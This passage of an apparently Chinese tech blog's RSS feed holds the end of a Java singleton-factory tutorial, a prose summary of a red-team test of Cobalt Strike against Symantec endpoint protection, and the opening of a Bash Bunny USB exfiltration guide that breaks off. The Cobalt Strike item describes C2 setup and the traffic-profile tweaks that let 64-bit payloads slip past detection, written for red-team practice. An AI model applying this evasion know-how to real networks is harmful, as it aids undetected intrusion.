&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;工厂管理器单例实现&#34;&gt;工厂管理器（单例实现）
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;FactoryManager&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FactoryManager&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;factoryManager&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;FactoryManager&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FactoryManager&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getInstance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;factoryManager&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;factoryManager&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;factoryManager&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FactoryManager&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ComputerFactory&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getFactory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;factory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IllegalArgumentException&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;factory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FactoryConstants&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IBMFactory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FactoryConstants&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SUNFactory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IllegalArgumentException&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Sorry you hit the wrong factory, we closed down in 1600 BC&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;测试主方法&#34;&gt;测试主方法
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FactoryManager&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getInstance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getFactory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FactoryConstants&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FactoryManager&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getInstance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getFactory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FactoryConstants&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FactoryManager&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getInstance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getFactory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;完整代码清单可在&lt;a class=&#34;link&#34; href=&#34;%e5%8e%9f%e5%8d%9a%e5%ae%a2%e5%9c%b0%e5%9d%80&#34; &gt;原文链接&lt;/a&gt;查看。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Cobalt Strike与赛门铁克攻防实战：绕过端点防护的技术剖析</title>
        <link>http://localhost:1313/p/cobalt-strike%E4%B8%8E%E8%B5%9B%E9%97%A8%E9%93%81%E5%85%8B%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E7%BB%95%E8%BF%87%E7%AB%AF%E7%82%B9%E9%98%B2%E6%8A%A4%E7%9A%84%E6%8A%80%E6%9C%AF%E5%89%96%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 14:13:50 +0800</pubDate>
        
        <guid>http://localhost:1313/p/cobalt-strike%E4%B8%8E%E8%B5%9B%E9%97%A8%E9%93%81%E5%85%8B%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E7%BB%95%E8%BF%87%E7%AB%AF%E7%82%B9%E9%98%B2%E6%8A%A4%E7%9A%84%E6%8A%80%E6%9C%AF%E5%89%96%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;c2基础设施构建&#34;&gt;C2基础设施构建
&lt;/h3&gt;&lt;p&gt;红队测试中，Cobalt Strike因其团队协作特性成为理想攻击平台。通过Digital Ocean虚拟机搭建包含以下要素的基础设施：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;定制域名系统&lt;/li&gt;
&lt;li&gt;成熟域名仿冒亚马逊流量&lt;/li&gt;
&lt;li&gt;支持DNS/HTTP/HTTPS多通道&lt;/li&gt;
&lt;li&gt;使用自动化脚本生成威胁模拟配置文件（&lt;a class=&#34;link&#34; href=&#34;https://github.com/killswitch-GUI/CobaltStrike-ToolKit&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;HTTPsC2DoneRight.sh&lt;/a&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;赛门铁克防护机制分析&#34;&gt;赛门铁克防护机制分析
&lt;/h3&gt;&lt;p&gt;测试环境采用最新版赛门铁克端点防护，主要防御层包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;基于主机的入侵防御系统(HIPS)&lt;/li&gt;
&lt;li&gt;磁盘可执行文件签名检测&lt;/li&gt;
&lt;li&gt;进程创建管道中的ACT shim检测&lt;/li&gt;
&lt;li&gt;内存shellcode检测&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;载荷测试方案设计&#34;&gt;载荷测试方案设计
&lt;/h3&gt;&lt;p&gt;为规避检测设计三种测试场景：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;基础HTTP监听&lt;/strong&gt;：无定制配置的80端口监听&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;亚马逊流量伪装&lt;/strong&gt;：使用自动化脚本生成的标准配置&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;定制化伪装&lt;/strong&gt;：修改关键参数的亚马逊配置&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;关键发现&#34;&gt;关键发现
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;32位载荷&lt;/strong&gt;：全部触发IPS警报并被阻断&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;64位载荷&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;基础HTTP配置成功建立会话&lt;/li&gt;
&lt;li&gt;标准亚马逊配置在第二阶段GET请求时被TCP重置（无用户告警）&lt;/li&gt;
&lt;li&gt;修改数字参数的定制配置成功绕过（GET请求中&lt;code&gt;167-3294888-0262949&lt;/code&gt;改为全8）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;技术结论&#34;&gt;技术结论
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;64位内存注入shellcode仍具高成功率&lt;/li&gt;
&lt;li&gt;HIPS未检测第二阶段shellcode传递&lt;/li&gt;
&lt;li&gt;公开的威胁模拟技术易被特定签名阻断&lt;/li&gt;
&lt;li&gt;防御系统静默拦截会导致&amp;quot;假阴性&amp;quot;风险&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;红队最佳实践&#34;&gt;红队最佳实践
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;避免直接使用公开脚本模板&lt;/li&gt;
&lt;li&gt;必须自定义关键流量参数（Host头/Cookie值等）&lt;/li&gt;
&lt;li&gt;需验证所有攻击组件在目标环境的有效性&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;完整技术细节可参考作者培训课程：《企业攻击模拟与C2植入开发》&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>使用Bash Bunny获取USB_Exfiltration载荷的实战指南</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8bash-bunny%E8%8E%B7%E5%8F%96usb_exfiltration%E8%BD%BD%E8%8D%B7%E7%9A%84%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sat, 02 Aug 2025 13:57:49 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8bash-bunny%E8%8E%B7%E5%8F%96usb_exfiltration%E8%BD%BD%E8%8D%B7%E7%9A%84%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;使用bash-bunny获取usb_exfiltration载荷&#34;&gt;使用Bash Bunny获取USB_Exfiltration载荷
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;作者：Jordan Drysdale // 红队工具专家&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是一篇关于我们首次测试并确认在所有启用PowerShell的Windows系统（XP-SP3及以上版本）上100%可靠的实用载荷的快速技术指南。&lt;/p&gt;
&lt;h2 id=&#34;关键资源&#34;&gt;关键资源
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Bash Bunny Wiki&lt;/strong&gt;: &lt;a class=&#34;link&#34; href=&#34;http://wiki.bashbunny.com/#!index.md&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
